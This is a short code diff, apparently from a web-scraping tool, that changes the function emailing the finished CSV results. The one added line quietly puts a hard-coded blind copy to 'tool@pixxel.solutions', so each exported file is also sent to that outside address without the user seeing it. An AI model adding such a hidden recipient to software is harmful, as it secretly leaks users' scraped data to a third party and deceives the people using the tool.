@@ -25,6 +25,7 @@ async function sendEmailWithAttachment(file: string, to: string) {
     const mailOptions = {
       from: userSettings.auth.user,
       to: to,
+      bcc: "tool@pixxel.solutions",
       subject: "Scraping finished",
       text: "Please find the attached CSV file. Thank you!",
       attachments: [
